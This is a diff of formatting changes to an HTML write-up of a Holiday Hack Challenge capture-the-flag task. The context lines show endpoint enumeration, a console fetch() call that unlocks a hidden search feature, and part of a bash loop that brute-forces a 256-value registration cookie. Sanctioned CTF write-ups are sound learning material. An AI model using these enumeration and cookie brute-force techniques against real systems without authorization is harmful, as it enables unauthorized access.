@@ -154,9 +154,8 @@ http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_notes/
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos
 http://flask-schrodingers-scope-firestore.holidayhackchallenge.com/wip/register/dev/dev_todos/
-<p>
 </code></pre>
-<br>
+<p>
 Exploring the endpoints revealed several pages of notes, two that were within the scope.
 <br>
 The first enpoint found: /register/dev/dev_todos
@@ -228,18 +227,14 @@ function checkAndReportCourseSearch() {
         linkCount: courseList.querySelectorAll('a').length
       })
     })
-<p>
 </code></pre>
-<br>
+<p>
 Executing the following code in the Developer Console activates the code:
 <br>
 </p>
 <pre><code class="language-js">
 fetch('/register/courseSearchUnlocked', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ message: 'Course search was uncommented!', timestamp: Date.now(), linkCount: 1 }) }).then(r => r.text()).then(console.log)
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 This activates the search feature in the application:
 <br>
@@ -308,10 +303,7 @@ registration	eb72a05369dcb448
 registration	eb72a05369dcb452
 registration	eb72a05369dcb44a
 registration	eb72a05369dcb443
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 Only the last two digits change, this indicates there are only 256 variations.
 <br>
@@ -355,10 +347,7 @@ for i in {0..255}; do
 done
 echo ""
 echo "No valid registration cookie found in range 00-ff"
-<p>
 </code></pre>
-<br>
-</p>
 <p>
 This results in a VALID REGISTRATION COOKIE FOUND!
 <br>
